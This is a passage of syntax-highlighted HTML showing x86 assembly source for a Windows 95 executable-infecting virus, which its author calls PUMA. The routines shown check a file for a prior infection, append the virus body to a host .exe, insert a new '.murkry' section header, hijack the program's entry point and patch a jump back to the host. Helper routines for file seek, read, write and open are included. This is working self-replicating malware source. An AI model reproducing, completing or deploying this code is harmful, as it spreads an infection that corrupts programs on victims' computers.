        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">;entry</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc3">"rum."</span><span class="sc0">                </span><span class="sc1">;check it for the name</span><span class="sc0">

        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">InfectIt</span><span class="sc0">

</span><span class="sc5">TryError</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
 

</span><span class="sc1">;-------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;file is not infected and fits the specs we need go ahead and try it</span><span class="sc0">

</span><span class="sc5">InfectIt</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FIND_DATA</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;size of the exe</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FileSeek</span><span class="sc0">                        </span><span class="sc1">;get to the end of the file</span><span class="sc0">

        </span><span class="sc1">;this routine is now getting the amount PUMA must</span><span class="sc0">
        </span><span class="sc1">;write to the host,counting padding</span><span class="sc0">
        </span><span class="sc1">;FILE VIRUS SIZE = VirSize -1 + FileAlignment/FileAlignment</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">VirSize</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">03ch</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;file alignment</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">cdq</span><span class="sc0">               </span><span class="sc1">;edx = 0</span><span class="sc0">

        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;save amount to write for</span><span class="sc0">
                                                </span><span class="sc1">;section header</span><span class="sc0">

        
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PUMA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">PUMA</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc1">; on entry to filewrite eax = #bytes edx where to get the</span><span class="sc0">
        </span><span class="sc1">; bytes from</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FileWrite</span><span class="sc0">
 
</span><span class="sc1">;now we have the virus body at the end of the host we need to update the</span><span class="sc0">
</span><span class="sc1">;header so it gets control</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;set and get the new</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">;section count</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                                                

        </span><span class="sc1">;get the location in the file that the new section header must be</span><span class="sc0">
        </span><span class="sc1">;writen</span><span class="sc0">
        </span><span class="sc1">;Location =  (OldSecCount * Sec_Size)+PeSize</span><span class="sc0">
        </span><span class="sc1">; esi+ebp = Pe start on stack</span><span class="sc0">

        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SEC_SIZE</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">;eax = eax*SEC_SIZE</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc5">PE_SIZE</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">                         </span><span class="sc1">;eax = proper location</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">                         </span><span class="sc1">;in stack</span><span class="sc0">

        </span><span class="sc1">;now get esi to point to where we have the buffer for the</span><span class="sc0">
        </span><span class="sc1">;virus section header</span><span class="sc0">
        </span><span class="sc1">;then set edi to eax which is where the header should be on</span><span class="sc0">
        </span><span class="sc1">;our buffer in the stack</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">                         </span><span class="sc1">;esi -&gt;section hdr template</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">SEC_HEADER</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PUMA</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">;edi -&gt;new section hdr locati</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">


</span><span class="sc1">;ok we have the blank .murkry header entry</span><span class="sc0">
</span><span class="sc1">;now we need to fill in the blanks like how big are we</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;size of RawData from last</span><span class="sc0">
                                                </span><span class="sc1">;file write</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;ebx refrences the new </span><span class="sc0">
                                                </span><span class="sc1">;section header</span><span class="sc0">

</span><span class="sc1">;where are we </span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FIND_DATA</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;old size of EXE file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">;set PtrRawData = old size</span><span class="sc0">


 

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">-</span><span class="sc2">28h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;get SizeRawData from previous section</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                  </span><span class="sc1">;header</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc4">]</span><span class="sc1">;get SectionAlignment</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">              </span><span class="sc1">;add eax=SizeRawData-1+SectionAlignment</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                  </span><span class="sc1">;size of code in SectionAlignment blocks</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc1">;add in last section's virtual address</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">;and set VirtualAddress for this section</span><span class="sc0">

</span><span class="sc1">;That's the end of adding the new section header. Now we must modify a few</span><span class="sc0">
</span><span class="sc1">;fields in the PE header itself.</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;set up new entry point</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TEMP</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">;save old entry point here</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0ch</span><span class="sc0"> </span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;get SizeOfRawData from new section hdr</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1ch</span><span class="sc0"> </span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">;update SizeOfCode in PE header</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0"> </span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;get SizeRawData from viral section hdr</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">               </span><span class="sc1">;add eax=SizeRawData-1+SectionAlignment</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                   </span><span class="sc1">;size of code in SectionAlignment blocks</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">50h</span><span class="sc0"> </span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">;update SizeOfImage</span><span class="sc0">

</span><span class="sc1">;Now the header is completely set up and ready to go. The next step is to save</span><span class="sc0">
</span><span class="sc1">;it to disk.</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">FILEBUF</span><span class="sc0">             </span><span class="sc1">;eax = offset of PE header in file</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FileSeek</span><span class="sc0">                </span><span class="sc1">;seek  </span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;# of section headers to ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">SEC_SIZE</span><span class="sc0">            </span><span class="sc1">;size of section header</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                     </span><span class="sc1">;size of section headers</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">PE_SIZE</span><span class="sc0">             </span><span class="sc1">;size of PE header</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;ecx=amount to write</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;address to write from</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FileWrite</span><span class="sc0">               </span><span class="sc1">;update PE header</span><span class="sc0">


</span><span class="sc1">;ok we just need to update the return entry point so the host can</span><span class="sc0">
</span><span class="sc1">;have control</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FIND_DATA</span><span class="sc4">+</span><span class="sc2">20H</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;get old file size  murk</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">HostRet</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">PUMA</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FileSeek</span><span class="sc0">                </span><span class="sc1">;seek to proper location in file</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">40</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;get new entry point</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">HostRet</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">PUMA</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">     </span><span class="sc1">;RVA to jump from</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TEMP</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">;subtract from destination address</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                   </span><span class="sc1">;now adjust jump address in host</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TEMP</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FileWrite</span><span class="sc0">                </span><span class="sc1">;write it to file</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">DoneIt</span><span class="sc0">                   </span><span class="sc1">;and exit infect routine</span><span class="sc0">



 
</span><span class="sc1">;-------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;SetFilePointer( handle, dword number of bytes to move it, pointer to the high</span><span class="sc0">
</span><span class="sc1">; order bits of the move, flag of where we should start the move from)</span><span class="sc0">
</span><span class="sc1">;settings are FILE_BEGIN   = 0</span><span class="sc0">
</span><span class="sc1">;             FILE_CURRENT = 1</span><span class="sc0">
</span><span class="sc1">;             FILE_END     = 2</span><span class="sc0">
</span><span class="sc1">;returns in EAX the the new 32 bits of the file pointer</span><span class="sc0">
</span><span class="sc1">;if the pointer is pointing to a non null then this is the high order of the</span><span class="sc0">
</span><span class="sc1">;new value</span><span class="sc0">

</span><span class="sc1">;ALSO if the distance to move is a negative number you can move backwards</span><span class="sc0">



</span><span class="sc5">FileSeek</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">LARGE</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                         </span><span class="sc1">;from where do we seek</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">LARGE</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                         </span><span class="sc1">;high dword of where we</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;search to low dword</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FileHand</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SetPointer</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;-------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;WriteFile(handle, lp buffer of where data is, number of bytes,</span><span class="sc0">
</span><span class="sc1">; overlapp structure(set it to zero and forget it))</span><span class="sc0">

</span><span class="sc5">FileWrite</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">LARGE</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                         </span><span class="sc1">;needed to set to null (0)</span><span class="sc0">
                                                </span><span class="sc1">;for our needs</span><span class="sc0">

        </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">IOBYTES</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;this will hold how many</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;bytes actualy written</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">;how many bytes</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">                             </span><span class="sc1">;buffer to read data from</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FileHand</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;file handle</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Write</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;call the Read api</span><span class="sc0">

                                                </span><span class="sc1">;if no prob then eax = true 1</span><span class="sc0">
                                                </span><span class="sc1">;else set to 0 for false</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">;set z if problem</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;same as filewrite figure it out ;)</span><span class="sc0">

</span><span class="sc5">FileRead</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">LARGE</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc5">IOBYTES</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FileHand</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Read</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;if problem set z</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;-------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Ok we use CreateFile here cause thats what VLad did =) !!</span><span class="sc0">
</span><span class="sc1">;CreateFile(lp to a name,dword access rights, dword share,</span><span class="sc0">
</span><span class="sc1">; dword Security attributes, dword create dword attrandflags,</span><span class="sc0">
</span><span class="sc1">; handle to something ;) )</span><span class="sc0">
</span><span class="sc1">; lucky for us we can set most to zero and it still works</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; well thats it for my commets</span><span class="sc0">
</span><span class="sc1">;Murk</span><span class="sc0">
</span><span class="sc5">OpenIt</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0"> 

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">     

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">LARGE</span><span class="sc0"> </span><span class="sc5">OPEN_EXISTING</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">LARGE</span><span class="sc0"> </span><span class="sc5">GENERIC_READ</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">GENERIC_WRITE</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FIND_DATA</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc2">02ch</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;location of file name</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;in the win95 finddata</span><span class="sc0">
                                                </span><span class="sc1">;structure</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Create</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">                          </span><span class="sc1">;if -1 no good</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;-------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">Code_Sec</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00000020h</span><span class="sc0">
</span><span class="sc5">Executable</span><span class="sc0">      </span><span class="sc9">Equ</span><span class="sc0">     </span><span class="sc2">20000000h</span><span class="sc0">
</span><span class="sc5">Readable</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">40000000h</span><span class="sc0">        
</span><span class="sc1">;data                                                           H   D</span><span class="sc0">
